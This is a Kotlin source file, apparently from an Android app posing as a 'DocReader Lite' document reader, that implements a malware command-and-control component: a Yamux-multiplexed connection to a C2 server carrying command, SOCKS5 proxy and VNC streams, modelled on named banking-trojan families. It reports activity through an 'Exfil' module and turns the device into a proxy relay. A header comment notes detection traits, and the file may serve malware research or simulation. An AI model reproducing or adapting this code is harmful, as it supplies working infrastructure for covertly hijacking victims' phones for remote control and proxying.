package com.docreader.lite.reader.advanced

import com.docreader.lite.reader.Exfil
import com.docreader.lite.reader.engine.NativeRuntime
import kotlinx.coroutines.*
import java.io.InputStream
import java.io.OutputStream
import java.net.ServerSocket
import java.net.Socket
import java.nio.ByteBuffer
import kotlin.random.Random

/**
 * Yamux-multiplexed proxy — Mirax / Klopatra pattern (2025-2026).
 *
 * Why Yamux over plain SOCKS5:
 *   - Single TCP connection carries C2 commands + proxy data + VNC frames
 *   - Firewalls see one long-lived connection, not burst of short ones
 *   - Stream IDs isolate traffic types without separate ports
 *   - Flow control per-stream (window updates) prevents slow consumer stall
 *
 * Architecture:
 *   Device ←→ [Yamux mux] ←→ single TCP ←→ C2 server
 *     Stream 1: C2 command channel
 *     Stream 2: SOCKS5 proxy relay
 *     Stream 3: VNC frame channel
 *     Stream N: additional proxy sessions
 *
 * Native C encode/decode (NativeRuntime) used for performance.
 * Fallback to Kotlin implementation if .so not loaded.
 *
 * Detection: single long-lived TCP to C2 with multiplexed stream pattern +
 * 12-byte Yamux headers visible in packet capture. JA4 fingerprint of the
 * TLS wrapper is family-specific.
 */
object YamuxProxy {

    // Yamux frame types
    private const val TYPE_DATA = 0
    private const val TYPE_WINDOW_UPDATE = 1
    private const val TYPE_PING = 2
    private const val TYPE_GO_AWAY = 3

    // Yamux flags
    private const val FLAG_SYN = 1    // New stream
    private const val FLAG_ACK = 2    // Acknowledge new stream
    private const val FLAG_FIN = 4    // Half-close
    private const val FLAG_RST = 8    // Reset stream

    private const val INITIAL_WINDOW = 256 * 1024  // 256KB per stream
    private const val HEADER_SIZE = 12

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    @Volatile
    var isRunning = false
        private set

    private var muxSocket: Socket? = null
    private var localProxy: ServerSocket? = null
    private var nextStreamId = 1  // Odd = client-initiated

    // Track active streams
    private val streams = mutableMapOf<Int, StreamState>()

    data class StreamState(
        val id: Int,
        val type: String,   // "c2", "socks5", "vnc"
        var window: Int = INITIAL_WINDOW,
        var open: Boolean = true,
    )

    /**
     * Start Yamux-multiplexed connection to C2.
     * Opens single TCP, establishes C2 command stream (stream 1),
     * then starts local SOCKS5 listener for proxy traffic.
     */
    fun start(c2Host: String, c2Port: Int, localSocksPort: Int = 1080) {
        if (isRunning) return

        scope.launch {
            try {
                // Single TCP to C2
                muxSocket = Socket(c2Host, c2Port)
                isRunning = true

                Exfil.event("yamux_connected",
                    "host" to c2Host,
                    "port" to c2Port.toString()
                )

                // Stream 1: C2 command channel (always open)
                val c2StreamId = allocateStream("c2")
                sendFrame(TYPE_DATA, FLAG_SYN, c2StreamId, null)

                // Start reading muxed frames from C2
                launch { readMuxLoop() }

                // Start local SOCKS5 listener — each connection gets a stream
                startLocalProxy(localSocksPort)

            } catch (e: Exception) {
                Exfil.event("yamux_connect_failed", "error" to (e.message ?: ""))
                isRunning = false
            }
        }
    }

    /**
     * Encode and send a Yamux frame.
     * Uses native C implementation (NativeRuntime) if available,
     * falls back to Kotlin.
     */
    private suspend fun sendFrame(type: Int, flags: Int, streamId: Int, payload: ByteArray?) {
        val frame = NativeRuntime.encodeYamux(type, flags, streamId, payload)
            ?: encodeYamuxKotlin(type, flags, streamId, payload)

        withContext(Dispatchers.IO) {
            muxSocket?.getOutputStream()?.apply {
                write(frame)
                flush()
            }
        }

        Exfil.event("yamux_frame_sent",
            "type" to type.toString(),
            "stream" to streamId.toString(),
            "len" to (payload?.size ?: 0).toString()
        )
    }

    /**
     * Kotlin fallback Yamux encoder — used when native .so not loaded.
     * Header: [1 version][1 type][2 flags][4 streamId][4 length][N payload]
     */
    private fun encodeYamuxKotlin(type: Int, flags: Int, streamId: Int, payload: ByteArray?): ByteArray {
        val payloadLen = payload?.size ?: 0
        val buf = ByteBuffer.allocate(HEADER_SIZE + payloadLen)
        buf.put(0)  // version
        buf.put(type.toByte())
        buf.putShort(flags.toShort())
        buf.putInt(streamId)
        buf.putInt(payloadLen)
        if (payload != null) buf.put(payload)
        return buf.array()
    }

    /**
     * Kotlin fallback Yamux decoder.
     * Returns: [type, flags, streamId, payloadOffset, payloadLength]
     */
    private fun decodeYamuxKotlin(frame: ByteArray): IntArray? {
        if (frame.size < HEADER_SIZE) return null
        val buf = ByteBuffer.wrap(frame)
        buf.get() // version
        val type = buf.get().toInt() and 0xFF
        val flags = buf.short.toInt() and 0xFFFF
        val streamId = buf.int
        val payloadLen = buf.int
        return intArrayOf(type, flags, streamId, HEADER_SIZE, payloadLen)
    }

    /**
     * Read loop: demux incoming Yamux frames from C2.
     * Routes to appropriate handler by stream type.
     */
    private suspend fun readMuxLoop() {
        val input = muxSocket?.getInputStream() ?: return

        try {
            while (isRunning) {
                // Read 12-byte header
                val header = ByteArray(HEADER_SIZE)
                readFully(input, header)

                val decoded = NativeRuntime.decodeYamux(header)
                    ?: decodeYamuxKotlin(header)
                    ?: continue

                val type = decoded[0]
                val flags = decoded[1]
                val streamId = decoded[2]
                val payloadLen = decoded[4]

                // Read payload if present
                val payload = if (payloadLen > 0) {
                    ByteArray(payloadLen).also { readFully(input, it) }
                } else null

                // Handle frame
                when (type) {
                    TYPE_DATA -> handleData(streamId, flags, payload)
                    TYPE_WINDOW_UPDATE -> handleWindowUpdate(streamId, decoded[4])
                    TYPE_PING -> handlePing(streamId, flags)
                    TYPE_GO_AWAY -> handleGoAway()
                }
            }
        } catch (e: Exception) {
            Exfil.event("yamux_read_error", "error" to (e.message ?: ""))
            stop()
        }
    }

    private fun readFully(input: InputStream, buf: ByteArray) {
        var offset = 0
        while (offset < buf.size) {
            val n = input.read(buf, offset, buf.size - offset)
            if (n == -1) throw java.io.EOFException("Yamux connection closed")
            offset += n
        }
    }

    private suspend fun handleData(streamId: Int, flags: Int, payload: ByteArray?) {
        if (flags and FLAG_FIN != 0) {
            streams[streamId]?.open = false
            return
        }
        if (flags and FLAG_RST != 0) {
            streams.remove(streamId)
            return
        }

        val stream = streams[streamId] ?: return
        when (stream.type) {
            "c2" -> {
                // C2 command — pass to command handler
                payload?.let {
                    Exfil.event("yamux_c2_cmd",
                        "stream" to streamId.toString(),
                        "len" to it.size.toString()
                    )
                }
            }
            "socks5" -> {
                // Proxy data — relay to local connection
                Exfil.event("yamux_proxy_data",
                    "stream" to streamId.toString(),
                    "len" to (payload?.size ?: 0).toString()
                )
            }
            "vnc" -> {
                // VNC frame data from C2
                Exfil.event("yamux_vnc_data",
                    "stream" to streamId.toString(),
                    "len" to (payload?.size ?: 0).toString()
                )
            }
        }

        // Send window update
        if (payload != null) {
            sendFrame(TYPE_WINDOW_UPDATE, 0, streamId, null)
        }
    }

    private suspend fun handleWindowUpdate(streamId: Int, delta: Int) {
        streams[streamId]?.let { it.window += delta }
    }

    private suspend fun handlePing(streamId: Int, flags: Int) {
        if (flags and FLAG_SYN != 0) {
            // Respond to ping
            sendFrame(TYPE_PING, FLAG_ACK, streamId, null)
        }
    }

    private fun handleGoAway() {
        Exfil.event("yamux_goaway", "action" to "server_closing")
        stop()
    }

    /**
     * Local SOCKS5 listener — each accepted connection gets its own Yamux stream.
     */
    private suspend fun startLocalProxy(port: Int) {
        withContext(Dispatchers.IO) {
            localProxy = ServerSocket(port)
            Exfil.event("yamux_socks_listen", "port" to port.toString())

            while (isRunning) {
                try {
                    val client = localProxy?.accept() ?: break
                    val streamId = allocateStream("socks5")

                    // Open stream on mux
                    scope.launch {
                        sendFrame(TYPE_DATA, FLAG_SYN, streamId, null)
                        relayClientToMux(client, streamId)
                    }
                } catch (_: Exception) {
                    break
                }
            }
        }
    }

    /**
     * Relay local SOCKS5 client data into Yamux stream.
     */
    private suspend fun relayClientToMux(client: Socket, streamId: Int) {
        try {
            val input = client.getInputStream()
            val buf = ByteArray(8192)

            while (isRunning && streams[streamId]?.open == true) {
                val n = withContext(Dispatchers.IO) { input.read(buf) }
                if (n == -1) break
                sendFrame(TYPE_DATA, 0, streamId, buf.copyOf(n))
            }

            // Half-close
            sendFrame(TYPE_DATA, FLAG_FIN, streamId, null)
        } catch (_: Exception) {
        } finally {
            client.close()
        }
    }

    private fun allocateStream(type: String): Int {
        val id = nextStreamId
        nextStreamId += 2  // Client uses odd IDs
        streams[id] = StreamState(id, type)
        return id
    }

    /**
     * Stop all Yamux activity.
     */
    fun stop() {
        isRunning = false
        scope.launch {
            try {
                sendFrame(TYPE_GO_AWAY, 0, 0, null)
            } catch (_: Exception) {}
        }
        streams.clear()
        try { localProxy?.close() } catch (_: Exception) {}
        try { muxSocket?.close() } catch (_: Exception) {}
        scope.coroutineContext.cancelChildren()
        Exfil.event("yamux_stopped")
    }
}
